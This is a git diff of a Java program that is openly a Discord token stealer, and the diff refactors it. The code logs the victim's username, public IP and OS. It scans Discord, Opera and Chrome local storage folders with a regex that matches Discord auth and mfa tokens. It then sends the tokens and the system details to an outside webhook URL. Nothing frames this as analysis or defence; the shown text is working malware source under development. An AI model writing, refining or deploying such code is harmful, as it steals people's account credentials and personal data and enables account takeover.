@@ -26,15 +26,15 @@ public class Main {
         sendMessage("--------------------------------------------------------------------------------------");
         TimeUnit.MILLISECONDS.sleep(100);
 
-        //NAME: IP: OS:
+        //PC INFO LOGGER
         try {
             URL whatismyip = new URL("http://checkip.amazonaws.com");
-            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
-                    whatismyip.openStream()));
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
             String userIP = bufferedReader.readLine();
             String userName = System.getProperty("user.name");
             sendMessage("\n``` NAME : " + userName + "\n IP" + "   : " + userIP + " \n OS   : " + userOS + "```");
-        } catch (Exception ignore) {
+        } catch (Exception ex) {
+            sendMessage("``` UNABLE TO PULL INFORMATION : " + ex + "```");
         }
 
         //TOKEN LOGGER
@@ -80,24 +80,24 @@ public class Main {
             out.flush();
             in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String line;
-            while ((line = in.readLine()) != null) {
+            while ((line = in.readLine()) != null)
                 result.append("/n").append(line);
-            }
 
         } catch (Exception e) {
             e.printStackTrace();
+
         } finally {
             try {
-                if (out != null) {
+                if (out != null)
                     out.close();
-                }
-                if (in != null) {
+                if (in != null)
                     in.close();
-                }
             } catch (IOException ex) {
                 ex.printStackTrace();
             }
+
         }
+
         System.out.println(result.toString());
     }
 
@@ -111,88 +111,48 @@ public class Main {
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
             paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
-
-
-            int cx = 0;
-            webhooks.append("TOKEN\n");
-
-            for (String path : paths) {
-                File f = new File(path);
-                String[] pathnames = f.list();
-                if (pathnames == null) continue;
-
-                for (String pathname : pathnames) {
-                    try {
-                        FileInputStream fstream = new FileInputStream(path + pathname);
-                        DataInputStream in = new DataInputStream(fstream);
-                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
-
-                        String strLine;
-                        while ((strLine = br.readLine()) != null) {
-
-                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
-                            Matcher m = p.matcher(strLine);
-
-                            while (m.find()) {
-                                if (cx > 0) {
-                                    webhooks.append("\n");
-                                }
-                                webhooks.append("" + path + pathname + "  --> token: ").append(m.group());
-                                cx++;
-                            }
-
-                        }
-
-                    } catch (Exception ignored) {
-                        webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //error: Server returned HTTP response code: 400 for URL:
-                        TimeUnit.MILLISECONDS.sleep(100);
-                    }
-                }
-            }
-            sendMessage("```" + webhooks.toString() + "```");
-
-        } else if (userOS.contains("Mac")) {
+        } else if (userOS.contains("Mac"))
             paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
+        else
+            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
 
-            int cx = 0;
-            webhooks.append("TOKEN\n");
+        int cx = 0;
+        webhooks.append("TOKEN\n");
 
-            for (String path : paths) {
-                File f = new File(path);
-                String[] pathnames = f.list();
-                if (pathnames == null) continue;
+        for (String path : paths) {
+            File f = new File(path);
+            String[] pathnames = f.list();
+            if (pathnames == null) continue; //should be break?
 
-                for (String pathname : pathnames) {
-                    try {
-                        FileInputStream fstream = new FileInputStream(path + pathname);
-                        DataInputStream in = new DataInputStream(fstream);
-                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
+            for (String pathname : pathnames) {
+                try {
+                    FileInputStream fstream = new FileInputStream(path + pathname);
+                    DataInputStream in = new DataInputStream(fstream);
+                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
 
-                        String strLine;
-                        while ((strLine = br.readLine()) != null) {
+                    String strLine;
+                    while ((strLine = br.readLine()) != null) {
+                        Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
+                        Matcher m = p.matcher(strLine);
 
-                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
-                            Matcher m = p.matcher(strLine);
-
-                            while (m.find()) {
-                                if (cx > 0) {
-                                    webhooks.append("\n");
-                                }
-                                webhooks.append(" ").append(m.group());
-                                cx++;
+                        while (m.find()) {
+                            if (cx > 0) {
+                                webhooks.append("\n");
                             }
-
+                            webhooks.append("" + path + pathname + "  --> token: ").append(m.group());
+                            cx++;
                         }
-
-                    } catch (Exception ignored) {
                     }
+
+                } catch (Exception ignored) {
+                    webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //occasional error: Server returned HTTP response code: 400 for URL:
+                    TimeUnit.MILLISECONDS.sleep(100);
                 }
             }
-            sendMessage("```" + webhooks.toString() + "```");
-
-        } else {
-            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
         }
+
+        sendMessage("```" + webhooks.toString() + "```");
+
     }
 
     private static void sendFile(File file) throws IOException {
@@ -204,7 +164,8 @@ public class Main {
         PrintWriter baseCode = new PrintWriter(textfile);
 
         baseCode.println(encodedString);
-        /*^base64 code^*/
+        /*^base64 code^
+        https://www.baeldung.com/java-base64-image-string*/
 
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(webhookURL).openConnection();
